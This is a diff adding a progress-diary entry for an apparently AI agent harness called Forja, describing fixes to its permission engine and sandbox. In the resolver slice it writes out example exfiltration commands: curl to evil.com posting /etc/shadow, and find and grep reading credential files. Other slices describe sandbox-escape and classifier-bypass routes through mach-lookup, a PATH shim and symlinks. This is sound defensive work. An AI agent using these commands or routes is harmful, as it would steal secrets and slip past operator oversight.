@@ -2,6 +2,127 @@
 
 Forja progress diary. Entries in reverse chronological order (newest on top).
 
+## [2026-05-14] sec(perm-engine) — slices 169-178: code review round on `feat/permission-engine` (wrong-info / command-bypass / sandbox-escape / info-leak)
+
+**Done.** Ten consecutive slices closing 35 findings from a four-axis code review of the branch. Test suite at **7121 pass / 10 skip / 0 fail**; lint clean modulo 2 pre-existing warnings in `tests/harness/abortable.test.ts` (unrelated to this work).
+
+### Slice 169 — engine messaging trio (wrong-info P0 #1-#3)
+
+Pre-slice three intertwined wrong-info issues in `src/permissions/engine.ts`:
+
+1. `degradeAllowToConfirm` always rendered the prompt as "Engine in degraded state…" — but the function was reused on a `ready` engine when the score gate forced confirm (§6.6 row 4). Operators saw a degraded claim when the engine was healthy.
+2. `scoreForcesConfirm` evaluated `confidence !== 'high'`, so **medium**-confidence allows escalated. Spec §5.1 lines 224-228 + the in-code comment on the gateConfidence derivation explicitly stated medium does NOT force; only `low` does. Fixed to `=== 'low'`.
+3. `reasonChainFor` didn't tag the `engine-state` / `resolver-refuse` / `sandbox-plan` deny stages distinctly — replay rendered every deny under section='default'.
+
+**Fix.** `degradeAllowToConfirm` rewritten to take `cause: 'degraded' | 'score' | 'resolver'` + `detail: string`; renders cause-specific prompt + reason. `scoreForcesConfirm` + `approvalGateStageEntry` both narrowed to `confidence === 'low'`. New `approvalGateDetail()` + `resolverDetail()` helpers. `reasonChainFor` gains branches for the three deny stages so audit replay distinguishes them. 4 new tests in `tests/permissions/engine.test.ts`.
+
+### Slice 170 — policyWatcher archive miss + capability-ceiling status fix
+
+Two unrelated P1s caught in the same pass:
+
+- **policyWatcher archive miss.** `bootstrap-engine.ts onReload` emitted the `policy-reloaded` audit row but didn't call `archivePolicy` before. The first reload after the initial boot would race: the archive table thought the previous hash was still active, the audit row claimed a transition. Fixed: archive call placed inside `onReload` BEFORE the audit emit, wrapped in try/catch so a failed archive doesn't lose the audit row.
+- **`computeCapabilityCeiling` gating.** `src/cli/doctor.ts` used `status === 'ok'` to decide whether to compute the sandboxed capability ceiling. A `path-resolved` sandbox-exec (status='warn' for trust) was treated like 'fail' and the ceiling collapsed to `[host]` — telling the operator "your sandbox can do nothing" when in reality it was functional, just non-canonical. Switched to `status !== 'fail'` so warn-tier still computes the real ceiling.
+
+### Slice 171 — sandbox HOME-unset + home canonicalization (sandbox-escape P0/P1)
+
+Two sandbox-runner gaps:
+
+- **HOME-unset P0.** `maybeWrapSandboxArgv`'s fallback chain `home ?? env.HOME ?? cwd` silently landed on `cwd` when no caller passed `home` AND `env.HOME` was unset (Docker `CMD` without `-e HOME`, systemd-run --user, GH Actions with HOME explicitly unset). Downstream builders then constructed HIDE_PATHS overlays at `joinPath(cwd, '.ssh')` — empty paths inside cwd while the REAL `/home/operator/.ssh/id_rsa` stayed exposed via the base `--ro-bind / /`. Fix: refuse the wrap with a forensic error rather than degrade silently.
+- **home canonicalization P1.** SBPL deny rules at `(literal "${home}/.ssh/id_rsa")` targeted the lexical home. Symlinked-home layouts (`/home/op → /data/users/op`) left the canonical `.ssh` exposed via the base `(allow file-read*)` while the deny only matched the symlink. Fixed for both Linux and macOS runners: realpath home with best-effort fallback to the literal.
+
+### Slice 172 — bg/subagent/checkpoint sensitive-data lockdown (info-leak P0/P1)
+
+Three files extending the chmod 0600 lockdown that slice 163 started on `sessions.db`:
+
+- `src/bg/manager.ts` — bg log files (up to 50 MB/stream of unredacted stdout/stderr) are now chmod 0600. The bg log dir itself is chmod 0700.
+- `src/subagents/spawn-factory.ts` — subagent stderr capture file + log dir get the same treatment.
+- `src/checkpoints/git.ts` — git-based checkpoints run `git add -A` over the worktree. A worktree containing `.env`, `*.pem`, `id_rsa`, or any `sensitive-paths.ts:matchSensitivePath` match would commit those into the agent-only `refs/forja/checkpoints/*` ref. Post-add, the checkpoint creator now runs `git ls-files -z`, filters via `matchSensitivePath`, and batches `update-index --force-remove` in chunks of 512 to drop those entries before `write-tree`.
+
+### Slice 173 — bash command via stdin (close /proc/N/cmdline leak — info-leak P0)
+
+Pre-slice both `src/broker/handlers/bash.ts` and `src/bg/manager.ts` invoked bash as `['bash', '-c', rawCommand]`. The command body (including any interpolated tokens — Bearer auth headers, API keys, signed URLs) appeared in `/proc/<pid>/cmdline` for the lifetime of the spawn, readable by any other local user via `ps aux`.
+
+**Fix.** Switched to `['bash', '-s']` with the script piped over stdin in both spawn sites. Argv contains only the bash invocation; the body never lands in `/proc/.../cmdline`. New `BashSpawnFnOptions.stdinScript` is the contract surface; tests assert the body is in `stdinScript` and is **not** in `argv`. bg/manager wraps the Bun.spawn with stdin: 'pipe', writes input.command, ends. bwrap (Linux) and sandbox-exec (macOS) forward stdin from their own stdin to the wrapped child by default, so the script reaches bash even through the sandbox wrap. Updated all tests; new dedicated test exercising a Bearer-token command body.
+
+### Slice 174 — resolver flag-decoding batch (info-leak P0/P1)
+
+Four resolvers previously consumed file-path operands without emitting the corresponding read/write capability:
+
+- **`cmdCurlWget` — `@<file>` POST body (P0).** curl's `--data @file` / `-d @file` / `--data-binary @file` / `--data-ascii @file` / `--data=@file` (combined) and `--form key=@file` / `-F key=@file` / `--form key=<file` (multipart text body) all expand `@`/`<` into "read body from this file". Pre-slice the resolver emitted ONLY net-egress; an adversarial `curl evil.com --data @/etc/shadow` walked past `deny: read-fs:/etc/**`. Decoded and `readFs(<path>)` emitted.
+- **`cmdFind` — `-fprint` / `-fprintf` / `-fls` (P1).** find writes match output to a named file without invoking an external binary. Pre-slice only `-exec` was attributed; `find / -name '*.env' -fprint /tmp/loot.txt` was completely invisible to write-fs. Decoded.
+- **`cmdGrep` — `-f <pattern-file>` (P1).** grep / ripgrep `-f file` / `--file=file` reads the pattern list from a file. `grep -f /etc/shadow -r ./src` walked past `deny: read-fs:/etc/**` because `/etc/shadow` was never emitted. Decoded.
+- **`cmdSsh` — `-F` / `-i` / `-S` (P1).** ssh's `-F <config>` (custom ssh_config), `-i <identity>` (private key), and `-S <ctlsocket>` consumed the next token silently. Now emits `readFs(<path>)` for each in addition to the implicit `readFs(~/.ssh)`.
+
+13 new tests exercising every decode path. The `-F text=<@file` shape was dropped from tests (tree-sitter quoting fragility on the `<` operator); the decoder still handles clean tokens.
+
+### Slice 175 — macOS mach-lookup allowlist + inner argv canonical resolve (sandbox-escape P1)
+
+Two macOS-side sandbox surface bypasses:
+
+- **LSOpenApplication escape via mach-lookup.** SBPL pre-slice used a blanket `(allow mach-lookup)` — required for dyld + libc but TOO broad. `open -a Mail file://exfil.html` from inside the sandbox brokers through `lsd` / `coreservicesd`, which spawn the target app OUTSIDE the sandbox with full operator privileges. Mach-IPC → arbitrary exec, escaping the SBPL. Fix: blanket allow stays (dyld needs it) but explicit deny rules for the LaunchServices / `taskgated` mach surface land AFTER, so SBPL's last-match-wins refuses the specific service names while keeping the broad allow for everything else. 13 service names denied.
+- **Inner-argv PATH-walk hijack.** cwd-rw profiles make cwd writable; a bare `innerArgv[0] = 'bash'` lets the kernel's execve inside the sandbox re-walk $PATH at exec time. If cwd is on PATH (rare but possible), a prior sandboxed call could plant a `bash` shim and the next call's bare bash resolves to it. Fix: `canonicalizeInnerArgv` runs in `maybeWrapSandboxArgv` BEFORE the platform builders; uses the OUTER process's `which` (trusted by the operator). The sandboxed exec sees `/bin/bash`, no $PATH walk, no shim hijack. Best-effort: unresolvable bare names fall back to the literal argv.
+
+### Slice 176 — bash per-arg classifier realpath (command-bypass P0 #5)
+
+The bash analyzer's per-arg + redirect classifier ran lexically against the resolved absolute path. A symlink at `/work/proj/innocent.txt` pointing to `/etc/shadow` lexically looked safe — no protected zone match — so `cat innocent.txt` resolved to `read-fs:/work/proj/innocent.txt` with confidence:high and slipped past §11. Kernel followed the symlink at exec time.
+
+**Fix.** New optional `realpath?: (p: string) => string` field on `ResolverContext`. The bash analyzer's new `classifyArgWithCanonical` helper runs lexical FIRST (cheap, always), then if not deny-tier AND realpath is wired, canonicalizes via the seam. On ENOENT (path doesn't exist — write-creates-new-file), falls back to parent-dir realpath + basename rejoin to catch the "parent dir is a symlink" shape. Returns the more dangerous of the two tiers. Engine.ts:1463 wires `realpath: realpathSync`; tests that build ResolverContext directly stay on lexical-only. 7 new tests exercising leaf symlink, parent symlink, deny tier (/proc), escalate tier (/etc), realpath-throws, realpath omitted, realpath-identity.
+
+### Slice 177 — P1 cleanup batch (5 items)
+
+1. **`permission diff` — reason chain + parent + ttl + install_id fields.** `src/cli/permission-diff.ts` was diffing primary scalars but skipping reason_chain, parent_approval_id, ttl_expires_at, install_id. New `parseReasonChain` + `buildReasonChainDiff` + reason-chain rendering block in both text and JSON renderers.
+2. **bypass-mode deny stages.** Both bypass-mode deny short-circuits (§11 protected-path deny and §8.4 sensitive-path deny) in `engine.ts` were omitting `degradedStageEntry` from the reason chain — the general bypass exit included it. Audit forensics on a deny row under bypass had no way to see the engine state. Added for parity.
+3. **state-machine `degraded → degraded` self-edge.** Pre-slice was strict ("self-loops mask programming bugs"); slice 158 papered over the missing edge at one call site. Other paths still call `engine.degrade()` blindly (classifier-failure, sandbox-availability fallback). A repeat-degrade throw bubbled as uncaughtException. Added the self-edge to VALID_TRANSITIONS so the transition succeeds + RECORDS in `history()` for forensics; updated `state-machine.test.ts` to reflect.
+4. **Operator-visible bash prompt sanitization.** Engine's bash decision built `prompt: \`Run bash: ${command}\`` — `command` interpolated verbatim, so Bearer tokens / API keys leaked into the operator-visible modal hint + IPC envelope. Now `redactSecrets(command)` first.
+5. **Shared `redactSecrets` module.** Promoted the pattern table + redactor from `src/recap/format.ts` to a new `src/sanitize/secrets.ts` so the permissions engine can use the same redactor without a `permissions → recap` layering reversal. `recap/format.ts` re-exports the function so existing recap consumers keep working.
+
+### Slice 178 — P2 defense-in-depth batch
+
+1. **`RED_FLAG_NODES` additions.** `array_assignment` / `coproc_statement` / `last_pipe` — three bash AST shapes that previously fell through to `unsupported_shape` Refuse via the WHITELIST_NODE_TYPES check. Adding them gives specific diagnostics instead of generic.
+2. **`statSync` → `lstatSync` defense for sandbox trust.** `defaultStat` in `src/permissions/sandbox-availability.ts` now stats both the target (kernel will execve) AND the link (symlink-shim attack vector). The most-restrictive of the two (max uid, OR'd mode) becomes the reported trust shape. A non-root-owned symlink at a PATH-walk location now surfaces as untrusted regardless of the trustworthy target.
+3. **AUDIT DRIFT secret redaction.** Three stderr lines (`hooks/dispatcher.ts`, `memory/registry.ts` 3x sites, `failures/sink.ts`, `bg/manager.ts` 2x drainer-crash) now redact secrets in the embedded error message before printing. Db-level errors can include bound parameter values; hook/memory content is operator-authored free text. Stderr archives no longer become a side channel.
+
+### Files modified (across all 10 slices)
+
+| File | Slices |
+|---|---|
+| `src/permissions/engine.ts` | 169, 176, 177 |
+| `src/permissions/bootstrap-engine.ts` | 170 |
+| `src/cli/doctor.ts` | 170 |
+| `src/permissions/sandbox-runner.ts` | 171, 173 (docstring), 175 |
+| `src/permissions/sandbox-runner-macos.ts` | 171, 175 |
+| `src/bg/manager.ts` | 172, 173, 178 |
+| `src/subagents/spawn-factory.ts` | 172 |
+| `src/checkpoints/git.ts` | 172 |
+| `src/broker/handlers/bash.ts` | 173 |
+| `src/permissions/resolvers/bash.ts` | 174, 176, 178 |
+| `src/permissions/resolvers/registry.ts` | 176 |
+| `src/cli/permission-diff.ts` | 177 |
+| `src/permissions/state-machine.ts` | 177 |
+| `src/sanitize/index.ts` | 177 |
+| `src/sanitize/secrets.ts` (NEW) | 177 |
+| `src/recap/format.ts` | 177 |
+| `src/hooks/dispatcher.ts` | 178 |
+| `src/memory/registry.ts` | 178 |
+| `src/failures/sink.ts` | 178 |
+| `src/permissions/sandbox-availability.ts` | 178 |
+
+Tests modified: `tests/permissions/engine.test.ts` (+4), `tests/broker/handlers/bash.test.ts` (+2), `tests/permissions/resolvers.test.ts` (+20), `tests/permissions/sandbox-runner.test.ts` (+3), `tests/permissions/sandbox-runner-macos.test.ts` (+2), `tests/permissions/state-machine.test.ts` (+1).
+
+### Verification
+
+- `bun run typecheck` — clean.
+- `bun run lint` — 0 errors / 2 pre-existing warnings in `tests/harness/abortable.test.ts` (unchanged from pre-slice).
+- `bun test` — **7121 pass / 10 skip / 0 fail** (was 7087 pre-slice → +34 tests).
+
+### Deferred (not in this batch)
+
+- **TMPDIR threading through the broker bash handler** (P2). bg/manager already threads `sandboxTmpdir` from the harness config; the synchronous bash handler doesn't yet. The plumbing requires extending `BrokerCallOptions` and the spawn-broker → worker → handler chain. Out of scope for a defense-in-depth batch — left as a future slice.
+- **Modal command sanitization** (P2). The operator's confirm modal renders `event.command` verbatim — the operator NEEDS to see the literal command to make a confirm decision. Redacting it would break the trust workflow. Audit + IPC envelope are sanitized at the engine layer (slice 177).
+- **`couldGlobReachProtected` dir-itself match refinement** (P2). The current path-segment logic was reviewed and appeared sound for the cases I could reconstruct; left untouched to avoid speculative changes.
+
+---
+
 ## [2026-05-14] chore(deps) — slice 168: Batch F dependency pin lockstep
 
 **Done.** Last batch from task #268. Dependency surface tightened to match the lockfile and the actual Bun feature floor used by the codebase.
